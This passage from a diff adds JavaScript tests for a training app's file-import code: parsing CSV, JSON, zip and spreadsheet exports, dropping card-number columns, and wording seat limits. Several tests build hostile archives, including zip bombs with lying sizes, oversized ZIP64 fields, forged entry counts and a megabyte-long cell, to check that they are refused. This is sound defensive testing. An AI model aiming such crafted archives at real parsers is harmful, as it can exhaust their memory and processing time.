+  eq(IC.seats({ limit: 10, athletes: 10, pending: 2 }).left, 0);
+  s = IC.seats({ limit: 9999, athletes: 40, pending: 3 }); eq(s.unlimited, true); eq(s.left, Infinity);
+  eq(IC.pickWithin([1, 1, 1, 1].map((x, i) => ({ i, picked: true })), 2).filter(p => p.picked).length, 2);
+});
+test('imports: a program grid (exercises down, weeks across) becomes cells for the review', () => {
+  const csv = 'Exercise,Week 1,Week 2,Week 3,Week 4\nDay 1,,,,\nSquat,3x5 @7,3x5 @7.5,3x4 @8,2x3 @6\nBench,4x6 75%,4x5 77.5%,4x4 80%,3x5 70%\nDay 2 · Pull,,,,\nDeadlift,3x3 @8,3x3 @8.5,2x2 @9,2x3 @6\nRDL,3x8,3x8,3x6,';
+  const a = IC.analyse(imTable(csv));
+  eq(a.layout, 'grid');
+  const read = IC.gridToRead(a, { unit: 'kg', name: 'Spring block' });
+  eq(read.weeks, 4); eq(read.days.length, 2); eq(read.days[1].name, 'Day 2 · Pull');
+  eq(read.days[0].exercises.map(e => e.name).join(','), 'Squat,Bench');
+  eq(read.days[0].exercises[1].cells.join('|'), '4x6 75%|4x5 77.5%|4x4 80%|3x5 70%');
+  eq(read.days[1].exercises[1].cells[3], '');
+  const draft = PhotoImport.draftFromRead(read);
+  const w = PhotoImport.draftToWeeks(draft);
+  eq(w.stats.weeks, 4); eq(w.stats.left, 0); eq(w.weeks[0].days[0].exercises[0].sets.length, 3);
+  // No day rows: one day, named after the tab.
+  const one = IC.gridToRead(IC.analyse(imTable('Lift,W1,W2\nSquat,3x5 @7,3x5 @8')), { name: 'Block A' });
+  eq(one.days.length, 1); eq(one.weeks, 2);
+});
+test('imports: a grid with each week over Sets / Reps / Load / RPE columns', () => {
+  const csv = 'Exercise,Week 1,,,,Week 2,,,\n,Sets,Reps,Load,RPE,Sets,Reps,Load,RPE\nSquat,3,5,160,7,3,5,165,7.5\nBench,4,6,100,,4,5,102.5,7.5\nPull-up,3,8,,,3,8,,';
+  const a = IC.analyse(imTable(csv));
+  eq(a.layout, 'grid');
+  const read = IC.gridToRead(a, { unit: 'kg' });
+  eq(read.weeks, 2); eq(read.days[0].exercises.length, 3);
+  eq(read.days[0].exercises[0].cells.join('|'), '3x5 160kg @7|3x5 165kg @7.5');
+  eq(read.days[0].exercises[1].cells[0], '4x6 100kg'); eq(read.days[0].exercises[2].cells[1], '3x8');
+});
+test('imports: a program table (Week / Day / Exercise rows) comes into the same review', () => {
+  const csv = 'Week,Day,Exercise,Sets,Reps,Load,RPE\n1,Day 1,Squat,3,5,160,7\n1,Day 1,Bench,4,6,100,7\n1,Day 2,Deadlift,3,3,200,8\n2,Day 1,Squat,3,5,165,7.5\n2,Day 1,Bench,4,5,102.5,7.5\n2,Day 2,Deadlift,3,3,205,8';
+  const read = IC.programToRead(IC.analyse(imTable(csv)), { unit: 'kg', name: 'Block' });
+  eq(read.weeks, 2); eq(read.days.map(d => d.name).join(','), 'Day 1,Day 2');
+  eq(read.days[0].exercises[0].cells.join('|'), '3x5 160kg @7|3x5 165kg @7.5');
+  eq(PhotoImport.draftToWeeks(PhotoImport.draftFromRead(read)).stats.sets, 20);
+});
+test('imports: Hevy API workouts as JSON (published workout fields; the response wrapper assumed)', () => {
+  const json = JSON.stringify({ page: 1, page_count: 1, workouts: [{ id: 'w1', title: 'Lower', start_time: '2025-03-04T12:00:00Z', end_time: '2025-03-04T13:10:00Z', exercises: [
+    { index: 0, title: 'Squat (Barbell)', notes: 'belt on', exercise_template_id: 'x', superset_id: null, sets: [
+      { index: 0, type: 'warmup', weight_kg: 60, reps: 5, distance_meters: null, duration_seconds: null, rpe: null },
+      { index: 1, type: 'normal', weight_kg: 180, reps: 5, rpe: 8 },
+      { index: 2, type: 'failure', weight_kg: 180, reps: 4, rpe: 10 }] }] }] });
+  const t = IC.tablesFromJson(json, 'workouts.json');
+  eq(t.length, 1);
+  const a = IC.analyse(t[0]);
+  eq(a.recognised.id, 'hevy-api'); eq(a.layout, 'log');
+  const r = SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'a1', today: IM_TODAY });
+  eq(r.logs.length, 2); eq(r.logs[0].date, '2025-03-04'); eq(r.logs[0].weight, 180); eq(r.skippedBy['Warm-up set'], 1);
+  assert(/To failure/.test(r.logs[1].note), r.logs[1].note);
+  eq(IC.tablesFromJson('[{"workouts": 1}', 'x.json').length, 0);       // not JSON: nothing, no throw
+});
+test('imports: POWALIFTA\'s own everything.json reads back in', () => {
+  const json = JSON.stringify({ source: 'powalifta.com', role: 'athlete', logs: [{ id: 'l1', athleteId: 'me', date: '2026-01-05', lift: 'squat', variant: 'Paused', exerciseName: '', weight: 150, reps: 3, rpe: 8, note: '' },
+    { id: 'l2', athleteId: 'me', date: '2026-01-05', lift: 'pull', variant: '', exerciseName: 'Barbell Row', weight: 80, reps: 10, rpe: 8 }] });
+  const a = IC.analyse(IC.tablesFromJson(json, 'everything.json')[0]);
+  eq(a.recognised.id, 'powalifta');
+  const r = SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'a1', today: IM_TODAY });
+  eq(r.logs.length, 2); eq(r.logs[0].variant, 'Paused'); eq(r.logs[1].exerciseName, 'Barbell Row');
+});
+test('imports: a zip of CSVs (a TrainHeroic athlete export: its file names and columns aren\'t published, so read as a plain zip)', () => {
+  const zip = SwitchKit.zip([{ name: 'export/workouts.csv', text: 'Date,Exercise,Weight,Reps\n2026-01-05,Squat,150,5' }, { name: 'export/profile.csv', text: 'Name,Email\nMaya,maya@example.com' }, { name: '__MACOSX/._workouts.csv', text: 'junk' }, { name: 'photo.jpg', text: 'jpg' }]);
+  assert(window.fflate && fflate.unzipSync, 'fflate loaded');
+  const out = IC.tablesFromZip(IC.unzip(zip));
+  eq(out.tables.map(t => t.name).join(','), 'workouts.csv,profile.csv'); eq(out.skipped.join(','), 'photo.jpg');
+  eq(IC.analyse(out.tables[0]).layout, 'log'); eq(IC.analyse(out.tables[1]).kind, 'roster');
+});
+test('imports: real .xlsx and .ods files through SheetJS: tabs, dates, percents', () => {
+  assert(window.XLSX && XLSX.write, 'SheetJS loaded');
+  const wb = XLSX.utils.book_new();
+  const log = XLSX.utils.aoa_to_sheet([['Date', 'Exercise', 'Weight', 'Reps', 'RPE'], [46083, 'Squat', 180, 5, 8], [46083, 'Bench', 110, 5, 8.5]]);
+  log.A2.z = 'd/m/yyyy'; log.A3.z = 'd/m/yyyy';
+  const grid = XLSX.utils.aoa_to_sheet([['Exercise', 'Week 1', 'Week 2'], ['Squat', '3x5 @7', '3x5 @8'], ['Bench', '4x6', 0.75]]);
+  grid.C3.z = '0%';
+  XLSX.utils.book_append_sheet(wb, log, 'Log'); XLSX.utils.book_append_sheet(wb, grid, 'Block');
+  ['xlsx', 'ods'].forEach(type => {
+    const bytes = new Uint8Array(XLSX.write(wb, { type: 'array', bookType: type }));
+    eq(IC.sniff('book.' + type, bytes), type);
+    const tabs = IC.readWorkbook(bytes);
+    eq(tabs.map(t => t.name).join(','), 'Log,Block');
+    eq(tabs[0].rows[1].cells.join('|'), '2026-03-02|Squat|180|5|8');
+    eq(tabs[1].rows[2].cells[2], '75%');
+    eq(IC.analyse(tabs[0]).layout, 'log'); eq(IC.analyse(tabs[1]).layout, 'grid');
+    const quick = IC.readWorkbook(bytes, { sheetRows: 2 });
+    eq(quick[0].rows.length, 2);
+  });
+});
+test('imports: a 20,000-row CSV, read and planned in chunks with the same result as one pass', () => {
+  const lines = ['Date,Exercise,Weight,Reps,RPE'];
+  const lifts = ['Squat', 'Bench Press', 'Deadlift', 'Barbell Row'];
+  for (let i = 0; i < 20000; i++) { const d = new Date(Date.UTC(2019, 0, 1) + Math.floor(i / 8) * 86400000).toISOString().slice(0, 10); lines.push([d, lifts[i % 4], 100 + (i % 37), 5, 8].join(',')); }
+  const t0 = Date.now();
+  const a = IC.analyse(imTable(lines.join('\n')));
+  eq(a.layout, 'log'); eq(a.rowsCount, 20000);
+  const body = IC.bodyRows(a), map = IC.historyMap(a), opts = { athleteId: 'a1', unit: 'kg', today: IM_TODAY };
+  const one = SwitchKit.finishHistoryPlan(SwitchKit.extractHistory(body, map, opts), opts);
+  const ms = Date.now() - t0;
+  eq(one.logs.length, 20000);
+  // A guard against a slow path creeping in (quadratic work would take minutes), not a benchmark: the
+  // browser timing (4x CPU slowdown, longest task under 110 ms) lives in the imports work notes.
+  assert(ms < 20000, 'read and planned in ' + ms + ' ms');
+  // A chunk at a time gives the same sets and keys.
+  const x = SwitchKit.extractHistory(body.slice(0, 1500), map, opts);
+  eq(SwitchKit.finishHistoryPlan(x, opts).logs.length, 1500);
+});
+test('imports: the same rows through the mapper keep the import keys the switch kit gave them', () => {
+  const csv = 'date,exercise,weight,reps,rpe\n2026-01-05,Squat,150,5,8\n2026-01-05,Squat,150,5,8';
+  const before = SwitchKit.planHistoryImport(csv, { athleteId: 'a1', unit: 'kg', today: IM_TODAY });
+  const a = IC.analyse(imTable(csv));
+  const now = SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'a1', unit: 'kg', today: IM_TODAY });
+  eq(now.logs.map(l => l.importKey).join(','), before.logs.map(l => l.importKey).join(','));
+  const again = SwitchKit.planHistoryRows(IC.bodyRows(a), IC.historyMap(a), { athleteId: 'a1', unit: 'kg', today: IM_TODAY, existing: before.logs.map(l => Object.assign({}, l, { athleteId: 'a1' })) });
+  eq(again.logs.length, 0); eq(again.dupes, 2);
+});
+test('imports: the coach can say what a file is when the columns don\'t', () => {
+  const t = imTable('Who,Contact,Team\nMaya Chen,maya@example.com,Juniors\nLeo Grant,leo@example.com,Seniors');
+  eq(IC.analyse(t).kind, 'roster');
+  const forced = IC.analyse(imTable('Colour,Shape\nred,square'), { kind: 'roster' });
+  eq(forced.kind, 'roster'); eq(forced.layout, 'roster'); eq(forced.unplaced.join(','), '0,1');
+  const hist = IC.analyse(imTable('Name,Lift,Kilos,Reps\nMaya,Squat,150,5'), { kind: 'history' });
+  eq(hist.kind === 'roster', false);
+});
+test('imports: a quick look at a big tab still knows how many rows it has', () => {
+  assert(window.XLSX && XLSX.write, 'SheetJS loaded');
+  const rows = [['Date', 'Exercise', 'Weight', 'Reps']]; for (let i = 0; i < 300; i++) rows.push(['2026-01-0' + (1 + i % 9), 'Squat', 100 + i % 20, 5]);
+  const wb = XLSX.utils.book_new(); XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(rows), 'Log');
+  const quick = IC.readWorkbook(new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx' })), { sheetRows: 40 });
+  eq(quick[0].rows.length, 40); eq(quick[0].fullRows, 301);
+});
+test('imports: the demo\'s sample files read the way the pitch shows them', () => {
+  const S = IC.SAMPLES;
+  const ro = IC.analyse(imTable(S.roster.text, S.roster.name));
+  eq(ro.recognised.id, 'truecoach'); assert(IC.planRoster(ro, {}).people.length >= 8, 'a roster to pick from');
+  const hi = IC.analyse(imTable(S.history.text, S.history.name));
+  eq(hi.recognised.id, 'strong');
+  const wide = IC.analyse(imTable(S.wide.text, S.wide.name)); eq(wide.layout, 'wide');
+  const grid = IC.analyse(imTable(S.grid.text, S.grid.name)); eq(grid.layout, 'grid');
+  eq(PhotoImport.draftToWeeks(PhotoImport.draftFromRead(IC.gridToRead(grid, {}))).stats.left, 0);
+});
+test('imports: a zip is read one way, strictly: entry counts that disagree, ZIP64 and a directory outside the file are refused', () => {
+  const log = 'Date,Exercise,Weight,Reps\n2026-01-05,Squat,150,5';
+  eq(IC.tablesFromZip(IC.unzip(imZip([{ name: 'log.csv', data: log }]))).tables[0].rows.length, 2);
+  eq(IC.tablesFromZip(IC.unzip(imZip([{ name: 'log.csv', data: log, method: 0 }]))).tables[0].rows.length, 2);   // stored too
+  // The review's file: the end record says 1 entry in all and 300 on this disk (fflate went by the 300).
+  imRefused(() => IC.unzip(imZip([{ name: 'f0.csv', data: log }], { total: 1, more: 299 })), 'bad_zip');
+  // ZIP64: the classic end record saturated, the real counts elsewhere.
+  imRefused(() => IC.unzip(imZip([{ name: 'a.csv', data: log }], { total: 0xFFFF, onDisk: 0xFFFF })), 'bad_zip');
+  imRefused(() => IC.unzip(imZip([{ name: 'a.csv', data: log, size: 0xFFFFFFFF, csize: 0xFFFFFFFF }])), 'bad_zip');
+  // A directory past the end of the file; a file that isn't where the directory says.
+  imRefused(() => IC.unzip(imZip([{ name: 'a.csv', data: log }], { cdAt: 1 << 20 })), 'bad_zip');
+  imRefused(() => IC.unzip(imZip([{ name: 'a.csv', data: log, offset: 3 }])), 'bad_zip');
+  imRefused(() => IC.unzip(imZip([{ name: 'a.csv', data: log, method: 0, size: 3 }])), 'bad_zip');   // stored, sizes disagree
+  // A UTF-8 name without the UTF-8 flag (what macOS writes) is read, not skipped.
+  const z = IC.tablesFromZip(IC.unzip(imZip([{ name: 'José log.csv', data: log }])));
+  eq(z.tables.length, 1); eq(z.tables[0].name, 'José log.csv');
+  // sniff still tells a workbook by its parts, and a zip it refuses by its extension.
+  eq(IC.sniff('x.xlsx', imZip([{ name: 'xl/workbook.xml', data: '<x/>' }])), 'xlsx');
+  eq(IC.sniff('x.xlsx', imZip([{ name: 'xl/workbook.xml', data: '<x/>' }], { total: 1, more: 3 })), 'xlsx');
+  eq(IC.zipEntries(imZip([{ name: 'a.csv', data: log }], { total: 1, more: 3 })).length, 0);
+});
+test('imports: a zip bomb stops before it costs anything: a size that lies, a stream past its size, too many files, too much in all', () => {
+  const zeros = fflate.deflateSync(new Uint8Array(32 << 20));   // 32 MB of zeros in about 32 KB
+  imCounting(() => {
+    // Declared as 100 bytes (deflate never writes more than it was given): refused before a byte is inflated.
+    imOut.n = 0; imRefused(() => IC.unzip(imZip([{ name: 'a.csv', comp: zeros, size: 100 }])), 'too_big'); eq(imOut.n, 0);
+    // Declared as 1 MB, which looks honest: inflating stops within one 16 KB slice, not after all 32 MB.
+    imOut.n = 0; imRefused(() => IC.unzip(imZip([{ name: 'a.csv', comp: zeros, size: 1 << 20 }])), 'too_big');
+    assert(imOut.n < 20 << 20, 'stopped after ' + imOut.n + ' bytes');
+    // 401 files; five declaring 17 MB each (85 MB): refused from the directory, nothing inflated.
+    imOut.n = 0; imRefused(() => IC.unzip(imZip(Array.from({ length: 401 }, (x, i) => ({ name: 'f' + i + '.csv', data: 'a,b\n1,2' })))), 'too_big'); eq(imOut.n, 0);
+    imOut.n = 0; imRefused(() => IC.unzip(imZip(Array.from({ length: 5 }, (x, i) => ({ name: 'f' + i + '.csv', comp: zeros, size: 17 << 20 })))), 'too_big'); eq(imOut.n, 0);
+    // The review's count trick with honest sizes: 300 directory entries of 20 MB each, the end record saying 1.
+    imOut.n = 0; imRefused(() => IC.unzip(imZip([{ name: 'f0.csv', comp: fflate.deflateSync(new Uint8Array(20 << 20)), size: 20 << 20 }], { total: 1, more: 299 })), 'bad_zip'); eq(imOut.n, 0);
+    // A photo or a file over 20 MB is listed, never inflated.
+    imOut.n = 0;
+    const big = IC.unzip(imZip([{ name: 'big.csv', comp: zeros, size: 32 << 20 }, { name: 'photo.jpg', data: 'jpg' }, { name: 'log.csv', data: 'Date,Exercise,Weight,Reps\n2026-01-05,Squat,150,5' }]));
+    eq(big.map(f => f.bytes ? 1 : 0).join(''), '001'); assert(imOut.n < 1000, 'only the small CSV inflated');
+  });
+});
+test('imports: a file a deflater made bigger than it was (old .NET ones grow data that won\'t compress by a few percent) still opens', () => {
+  // One fixed-Huffman block, every byte a literal: bytes 144-255 take 9 bits, so random data comes out about 6% bigger.
+  const fixedDeflate = (bytes) => {
+    const out = []; let acc = 0, n = 0;
+    const bits = (v, len) => { for (let i = 0; i < len; i++) { acc |= ((v >> i) & 1) << n; if (++n === 8) { out.push(acc); acc = 0; n = 0; } } };
+    const code = (c, len) => { let r = 0; for (let i = 0; i < len; i++) r |= ((c >> i) & 1) << (len - 1 - i); bits(r, len); };
+    bits(1, 1); bits(1, 2);
+    for (let i = 0; i < bytes.length; i++) { const b = bytes[i]; if (b < 144) code(0x30 + b, 8); else code(0x190 + b - 144, 9); }
+    code(0, 7);
+    if (n) out.push(acc);
+    return new Uint8Array(out);
+  };
+  const data = new Uint8Array(64 * 1024); let x = 12345;
+  for (let i = 0; i < data.length; i++) { x = (x * 1103515245 + 12345) >>> 0; data[i] = x >>> 24; }
+  const comp = fixedDeflate(data);
+  assert(comp.length > data.length * 1.04, 'grew ' + comp.length + ' from ' + data.length);
+  const got = IC.unzip(imZip([{ name: 'export.csv', comp, size: data.length }]))[0].bytes;
+  eq(got.length, data.length); eq(got.every((b, i) => b === data[i]), true);
+});
+test('imports: a workbook is checked as a zip before SheetJS opens it (sizes, ZIP64 fields, a cell of megabytes)', () => {
+  const wb = XLSX.utils.book_new(); XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['Date', 'Exercise', 'Weight', 'Reps'], ['2026-03-02', 'Squat', 180, 5]]), 'Log');
+  const files = fflate.unzipSync(new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx' })));
+  const sheet = Object.keys(files).find(n => /sheet1\.xml$/.test(n));
+  const book = (over) => imZip(Object.keys(files).map(n => Object.assign({ name: n, data: files[n] }, n === sheet ? over : {})));
+  eq(IC.readWorkbook(book({}))[0].rows.length, 2);                     // the same parts rebuilt here: read as before
+  const zeros = fflate.deflateSync(new Uint8Array(32 << 20));   // 32 MB of zeros in about 32 KB
+  imCounting(() => {
+    imOut.n = 0; imRefused(() => IC.readWorkbook(book({ comp: zeros, size: 100 })), 'too_big');   // its size lies: only the parts before it inflated
+    assert(imOut.n < 64 * 1024, 'inflated ' + imOut.n + ' bytes');
+    imOut.n = 0; imRefused(() => IC.readWorkbook(book({ comp: zeros, size: 1 << 20 })), 'too_big');               // inflates past it: one 16 KB slice
+    assert(imOut.n < 20 << 20, 'stopped after ' + imOut.n + ' bytes');
+  });
+  // A ZIP64 field asking SheetJS for 8 GB, in the local header or the directory.
+  imRefused(() => IC.readWorkbook(book({ lx: imZip64(8 * Math.pow(2, 30), 100) })), 'too_big');
+  imRefused(() => IC.readWorkbook(book({ cx: imZip64(8 * Math.pow(2, 30), 100) })), 'too_big');
+  // One cell holding 2 MB of text (SheetJS takes about 130 bytes a character), stored or deflated, whatever the part is called.
+  const cell = '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>' + 'a'.repeat(2 << 20) + '</t></is></c></row></sheetData></worksheet>';
+  imRefused(() => IC.readWorkbook(book({ data: cell })), 'long_cell');
+  imRefused(() => IC.readWorkbook(book({ data: cell, method: 0 })), 'long_cell');
+  // The count trick: refused here, as the zip reader refuses it.
+  imRefused(() => IC.readWorkbook(imZip(Object.keys(files).map(n => ({ name: n, data: files[n] })), { onDisk: Object.keys(files).length + 1 })), 'bad_zip');
+});
+test('imports: a client list with no header row: Column A, B, C, the first person kept, the card numbers dropped, nothing remembered', () => {
+  const csv = 'Maya Chen,maya.chen@example.com,4242 4242 4242 4242\nLeo Grant,leo.grant@example.com,4000 0566 5566 5556\nPriya Nair,priya.nair@example.com,5555 5555 5555 4444';
+  const t = imTable(csv, 'clients.csv');
+  eq(t.dropped.join(','), 'Column C');                                // the card numbers go by what they are
+  ['4242', '5556', '4444'].forEach(n => assert(JSON.stringify(t.rows).indexOf(n) < 0, 'no card number left in the table'));
+  const a = IC.analyse(t);
+  eq(a.noHeader, true); eq(a.headerIndex, -1); eq(a.headers.join(','), 'Column A,Column B'); eq(a.kind, 'roster'); eq(a.rowsCount, 3);
+  eq(a.fields.join(','), 'fullName,email');                          // guessed from what's in them
+  const p = IC.planRoster(a, { athletes: [], invites: [] });
+  eq(p.people.length, 3); eq(p.people[0].name, 'Maya Chen'); eq(p.people[0].email, 'maya.chen@example.com'); eq(p.counts.picked, 3);
+  eq(p.leftOut.length, 0); eq(p.dropped.join(','), 'Column C');
+  // A row of data is never remembered as columns' names, and a headerless file never matches a memory.
+  eq(IC.rememberMapping({}, ['Maya Chen', 'maya.chen@example.com'], ['fullName', 'email'], IM_TODAY), null);
+  const mem = {}; mem[IC.fingerprint(a.headers)] = { f: ['email', 'fullName'], at: IM_TODAY };
+  const again = IC.analyse(imTable(csv), { remembered: mem });
+  eq(again.fromMemory, false); eq(again.fields.join(','), 'fullName,email');
+  // A log with no header row keeps its first set; the date column is guessed.
+  const log = IC.analyse(imTable('2026-01-05,Squat,150,5,8\n2026-01-07,Bench,100,5,8\n2026-01-09,Deadlift,200,3,8'));
+  eq(log.noHeader, true); eq(log.rowsCount, 3); eq(log.fields[0], 'date'); eq(IC.bodyRows(log)[0].cells[1], 'Squat');
+  // A list whose status column says "active" (a header word) has no header either: its first row holds an email.
+  eq(IC.analyse(imTable('Maya Chen,maya@example.com,active\nLeo Grant,leo@example.com,active')).noHeader, true);
+  // A header of words it doesn't know is still a header.
+  eq(IC.analyse(imTable('Who,Contact\nMaya Chen,maya@example.com')).noHeader, false);
+  eq(IC.findHeader(imTable('Date,Exercise,Weight,Reps\n2026-01-05,Squat,150,5').rows).index, 0);
+});
+test('imports: card and payment columns under other names, and card numbers under any name, are dropped', () => {
+  const pay = ['CC', 'CC Number', 'Visa', 'Amount', 'Amount Due', 'Paid', 'Paid Until', 'Monthly Fee', 'Total Spent', 'Balance', 'Outstanding', 'Discount', 'Coupon',
+    'Charge', 'Cost', 'Venmo', 'PayPal', 'Lifetime Value', 'LTV', 'Earnings', 'Sales', 'Tax', 'VAT', 'Currency', 'Expiry', '$', 'USD', 'Price (€)', 'Last four'];
+  const t = imTable(['Name', 'Email'].concat(pay, ['Notes', 'Squad']).join(',') + '\n' + ['Maya Chen', 'maya@example.com'].concat(pay.map(() => '150'), ['4111 1111 1111 1111', 'Juniors']).join(','));
+  eq(t.dropped.slice().sort().join('|'), pay.concat(['Notes']).sort().join('|'));   // Notes held a card number
+  const a = IC.analyse(t);
+  eq(a.headers.join(','), 'Name,Email,Squad'); eq(a.kind, 'roster');
+  // A client list's billing words go too ("Monthly", "Rate"), a log keeps its own words ("Time spent", "Heart rate").
+  eq(IC.analyse(imTable('Name,Email,Monthly,Rates\nMaya Chen,maya@example.com,150,150')).headers.join(','), 'Name,Email');
+  const log = IC.analyse(imTable('Date,Exercise,Weight,Reps,Time spent,Heart rate,Plan,Logged at\n2026-01-05,Squat,150,5,40,120,3x5 @8,1767600000000'));
+  eq(log.dropped.length, 0); eq(log.headers.length, 8);
+  eq(IC.cardLike('4242 4242 4242 4242'), true); eq(IC.cardLike('4242-4242-4242-4242'), true); eq(IC.cardLike('378282246310005'), true);
+  eq(IC.cardLike('4242 4242 4242 4241'), false); eq(IC.cardLike('1767600000000'), false); eq(IC.cardLike('+44 7911 123456'), false); eq(IC.cardLike('150'), false);
+});
+test('imports: a client list\'s left-out columns say what they hold, never their values', () => {
+  const a = IC.analyse(imTable('Name,Email,Phone,Birthday,Squad,Shoe size,Notes\nMaya Chen,maya@example.com,+1 555 010 1234,1996-04-02,Juniors,38,Bad knee since 2024\nLeo Grant,leo@example.com,+1 555 010 9876,1990-01-02,Seniors,44,'), { kind: 'roster' });
+  const col = (h) => IC.describeColumn(a, a.headers.indexOf(h));
+  eq(col('Name'), 'Names'); eq(col('Email'), 'Emails'); eq(col('Phone'), 'Phone numbers'); eq(col('Birthday'), 'Dates');
+  eq(col('Shoe size'), 'Numbers'); eq(col('Squad'), 'Text'); eq(col('Notes'), 'Text');
+  const t = IC.analyse(imTable('Name,Email,Empty\nMaya Chen,maya@example.com,'), { kind: 'roster' });
+  eq(IC.describeColumn(t, 2), 'Empty');
+});
+test('imports: the seats in words: the plan on the web, only the room for lifters in the iPhone app before in-app purchase', () => {
+  const s = Object.assign(IC.seats({ limit: 25, athletes: 4, pending: 1 }), { athletes: 4, pending: 1, plan: 'Pro' });
+  let w = IC.seatText(s, 2, false);
+  eq(w.big, '18'); eq(w.title, 'seats left after these'); eq(w.sub, 'Pro plan · 4 lifters and 1 unused invite of 25 seats'); eq(w.bar, true);
+  w = IC.seatText(s, 2, true);
+  eq(w.big, '18'); eq(w.title, 'more lifters after these'); eq(w.sub, 'Room for 20 more lifters · 1 unused invite holds a place'); eq(w.bar, false);
+  assert(!/plan|seat|Pro|25/i.test(w.title + ' ' + w.sub), 'no plan name, no seat count: ' + w.sub);
+  const free = Object.assign(IC.seats({ limit: 3, athletes: 0, pending: 0 }), { athletes: 0, pending: 0, plan: 'Free' });
+  eq(IC.seatText(free, 1, true).title, 'more lifters after these'); eq(IC.seatText(free, 2, true).title, 'more lifter after these'); eq(IC.seatText(free, 0, true).sub, 'Room for 3 more lifters');
+  eq(IC.seatText(free, 0, false).sub, 'Free plan · 0 lifters of 3 seats');
+  const all = Object.assign(IC.seats({ limit: 9999, athletes: 40 }), { athletes: 40, pending: 0, plan: 'Premium' });
+  eq(IC.seatText(all, 3, true).big, '∞'); assert(!/plan|seat|Premium/i.test(JSON.stringify(IC.seatText(all, 3, true))), 'tier-blind');
+  // The wall: neutral words in the app, the plan's on the web.
+  const full = IC.seats({ limit: 3, athletes: 3 }), room = IC.seats({ limit: 10, athletes: 6 });
+  eq(IC.wallText(full, 0, true, true), 'You\'ve reached your athlete limit: each lifter and each unused invite counts toward it.');
+  eq(IC.wallText(room, 2, true, true), 'There\'s room for 4 more lifters: 2 other people stay unticked. Untick someone first.');
+  eq(IC.wallText(room, 2, false, false), 'Your plan has room for 4 more lifters: 2 other people stay unticked.');
+  eq(IC.wallText(full, 0, false, false), 'Your plan has no seats left. Each lifter and each unused invite holds one.');
+});
+test('imports: a quick look that filled its rows reads the whole tab when it\'s picked (a sheet with no size tag, or a wrong one)', () => {
+  const rows = [['Date', 'Exercise', 'Weight', 'Reps']]; for (let i = 0; i < 300; i++) rows.push(['2026-01-0' + (1 + i % 9), 'Squat', 100 + i % 20, 5]);
+  const wb = XLSX.utils.book_new(); XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(rows), 'Log'); XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['Lift', 'Max'], ['Squat', 200]]), 'Maxes');
+  const files = fflate.unzipSync(new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx' })));
+  ['', '<dimension ref="A1"/>'].forEach(dim => {
+    const bytes = imZip(Object.keys(files).map(n => ({ name: n, data: /sheet1\.xml$/.test(n) ? new TextDecoder().decode(files[n]).replace(/<dimension[^>]*\/>/, dim) : files[n] })));
+    const quick = IC.readWorkbook(bytes, { sheetRows: 41 });
+    eq(quick[0].rows.length, 41); eq(quick[0].cut, true, 'Log ' + JSON.stringify(dim)); eq(!!quick[1].cut, false);   // Maxes was read whole
+    eq(quick[0].fullRows <= 41, true);                                // no tag to believe: the picker says "over 40"
+    eq(IC.readWorkbook(bytes, { sheets: ['Log'] })[0].rows.length, 301);
+  });
+});
+test('imports: a tab whose 41st row is blank looks complete to the quick look; only the full read has every set (why openTable reads a picked tab whole)', () => {
+  const rows = [['Date', 'Exercise', 'Weight', 'Reps']]; for (let i = 0; i < 39; i++) rows.push(['2026-01-0' + (1 + i % 9), 'Squat', 100 + i % 20, 5]);
+  rows.push([]);   // row 41 blank: Excel writes no <row> for it
+  for (let i = 0; i < 260; i++) rows.push(['2026-02-0' + (1 + i % 9), 'Bench', 80 + i % 10, 5]);
+  const wb = XLSX.utils.book_new(); XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet(rows), 'Log');
+  const files = fflate.unzipSync(new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx' })));
+  ['', '<dimension ref="A1"/>'].forEach(dim => {
+    const bytes = imZip(Object.keys(files).map(n => ({ name: n, data: /sheet1\.xml$/.test(n) ? new TextDecoder().decode(files[n]).replace(/<dimension[^>]*\/>/, dim) : files[n] })));
+    const quick = IC.readWorkbook(bytes, { sheetRows: 41 })[0];
+    eq(quick.rows.length <= 41, true, 'the quick look stops at 41 rows ' + JSON.stringify(dim));
+    eq(IC.readWorkbook(bytes, { sheets: ['Log'] })[0].rows.length, 300, 'the full read has every set: header + 39 + 260 ' + JSON.stringify(dim));
+  });
+});
+test('imports: a size tag of a million rows, a stray cell in the last row, a merge down a million rows cost nothing; past 200,000 rows a tab is cut', () => {
+  const wb = XLSX.utils.book_new(); XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['Date', 'Exercise', 'Weight', 'Reps'], ['2026-03-02', 'Squat', 180, 5], ['2026-03-04', 'Bench', 120, 5]]), 'Log');
+  const files = fflate.unzipSync(new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx' })));
+  const sheet = (xml) => imZip(Object.keys(files).map(n => ({ name: n, data: /sheet1\.xml$/.test(n) ? xml(new TextDecoder().decode(files[n])) : files[n] })));
+  const t0 = Date.now();
+  let t = IC.readWorkbook(sheet(x => x.replace(/<dimension[^>]*\/>/, '<dimension ref="A1:CB1048576"/>')))[0];
+  eq(t.rows.length, 3); eq(t.rows[0].cells.length, 4); eq(t.fullRows, 1048576);
+  t = IC.readWorkbook(sheet(x => x.replace(/<dimension[^>]*\/>/, '').replace('</sheetData>', '<row r="1048576"><c r="CB1048576" t="inlineStr"><is><t>x</t></is></c></row></sheetData>')))[0];
+  eq(t.rows.length, 4); eq(t.rows[3].line, 1048576); eq(t.rows[0].cells.length, 80);
+  const merged = IC.tablesFromWorkbook({ SheetNames: ['M'], Sheets: { M: { '!ref': 'A1:B1048576', '!merges': [{ s: { r: 1, c: 0 }, e: { r: 1048575, c: 0 } }],
